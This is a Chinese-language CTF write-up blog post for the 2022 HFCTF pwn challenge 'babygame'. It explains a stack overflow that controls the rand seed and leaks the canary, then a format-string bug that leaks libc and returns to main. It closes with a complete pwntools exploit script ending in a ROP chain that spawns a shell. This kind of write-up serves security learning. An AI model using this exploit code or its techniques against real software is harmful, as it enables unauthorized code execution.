---
layout: post
title: "2022HFCTF pwn babygame wp"
date:   2022-3-24
tags: [ctf_wp]
comments: true
author: wsxk
---

这道题拓宽了我对fmt的理解，算是比较有意思的题目

### 保护机制

首先查看一下这道程序的保护机制有哪些

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/2.png)

保护全开了

### IDA分析

先把文件拖入IDA中进行静态分析

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/1.png)

清晰明了，首先在buf处会产生栈溢出

关键在sub_1305函数中，进去看看

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/3.png)

看到rock scissor paper ，这是石头剪刀布的游戏，而且出题人很黑心，要我们连输100局才能进入sub_13f7函数。

接下来看一下sub_13f7函数是什么

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/4.png)

哦吼，是一个格式化字符串漏洞

现在程序的流程很清楚了

1、输入名称（存在栈溢出）

2、用当前时间作为种子，用rand函数产生随机数作为石头剪刀布的操作

3、当输100次后，进入fmt漏洞的触发点

### 解决方案

首先看作为种子的临时变量v5

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/5.png)

它就在buf的正下方

这意味着我们可以利用栈溢出覆盖v5，换句话说，我们可以控制这个程序伪随机数的种子（输100次的问题就能解决了）

接下来是v7，这是canary的位置，注意 系统canary的末字节为'\x00'，目的是为了能够截断字符串。

在这里我们可以多覆盖一个字节，将canary的末字节覆盖为换行符，这样以来，系统在printf buf的时候，会打印出canary的值（虽然没什么用就是了）

最主要的不是canary，而是我们在调试时候发现的suprise。

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/6.png)

注意看，上图中 0x7ffc61e482f8的值就是canary（低字节是0a，我们覆盖后的），然后它的下面的值，是0x7ffc61e48400,这是栈上的地址！！ 也就是说，我们可以拿到栈的基址。 这里有一个要注意的点，因为0x7ffc61e48400末字节为00，所以打印不出来，这种情况下我们可以多试几次（因为栈基址会变化），肯定会遇到不为00的情况

现在的问题来了，现在这个fmt字符串怎么用？这才是难点，因为只有一次机会，弄完这回后，程序就会返回了。这时候的办法是用fmt修改地址，让它重新回到main函数中

现在再一次进行调试，这时候调试到输入fmt的时候

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/7.png)

注意看 0x7ffe5ac885c8处的值，他是printf的位置，换句话说，打印出它就能知道libc基址了！！！调试总是能给人带来惊喜啊。

这是64位程序，printf的前六个参数在寄存器中，0x7ffe5ac885c8相当于printf的第十个参数，也就是 我们输入的第九个参数， 即是 格式化字符串中 %9$lx的位置

那么现在明确了，fmt中首先要有%9$lx来泄露基址，可以看到它是0x7f303d474d6f，在用%lx打印时会打印出12个字节。

现在还剩下最后一个问题，用fmt漏洞修改程序的返回地址。这里跟踪printf函数，看看它的返回地址所在的栈位置在哪里

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/8.png)

用我们得到的栈基址减去它，能得到偏移量（偏移量是固定的

现在知道fmt覆盖内存的地址了 现在看看能改到哪里

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/9.png)

printf正常返回得到的地址在这里


![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-24-2022HFCTF_pwn_babygame/10.png)

我们惊喜的发现，main函数就在它下面，修改最后一个字节就可以搞定了（返回main函数

返回main函数后，用read函数会让我们在读一次

这时候因为现在的栈出了点问题，调试能发现应该发送什么来实现shell

这时候找libc里面的system等等和ROP链，大家应该都很熟悉了


### exp

    from pwn import *

    from ctypes import CDLL



    context.log_level = 'debug'



    io = process('./babygame',env={'LD_PRELOAD': './libc-2.31.so'})

    libc = CDLL('libc.so.6')

    libc.srand(0x31313131)

    libc2 = ELF('./libc-2.31.so')

    operate = [1,2,0]



    io.recvuntil("Please input your name:")

    payload = b'a'*256 + p64(0x3131313131313131)

    #gdb.attach(io)

    io.sendline(payload)

    io.recvuntil(b"111\n")

    canary = io.recv(7).rjust(8,b'\x00')

    log.success("canary:"+hex(u64(canary)))

    stack_base = io.recv(6).ljust(8,b'\x00')

    log.success("stack_base:"+hex(u64(stack_base)))

    stack_base = u64(stack_base)



    for i in range(100):

        io.recvuntil('round')

        choose = libc.rand()%3

        io.sendline(str(operate[choose]))



    target =  stack_base -824 

    #fmt = 'aaaaaa'

    fmt = b'%9$lx%170c%8$hhn' + p64(target)

    #p.send(fmt)

    # offset = 6

    gdb.attach(io)

    io.send(fmt)



    #gdb.attach(io)

    io.recvuntil(b'Good luck to you.\n')



    libc_base = int(io.recv(12),16) - 0x61d6f

    system = libc_base + libc2.sym['system']

    binsh = libc_base + next(libc2.search(b'/bin/sh'))

    print("libc")

    print(hex(libc_base))

    pop_rdi = 0x23b72

    ret = 0x22679 

    ropchain = p64(0xdeadbeef) + p64(ret+libc_base) + p64(pop_rdi+libc_base) + p64(binsh) + p64(system)



    io.sendline(ropchain)

    io.interactive()




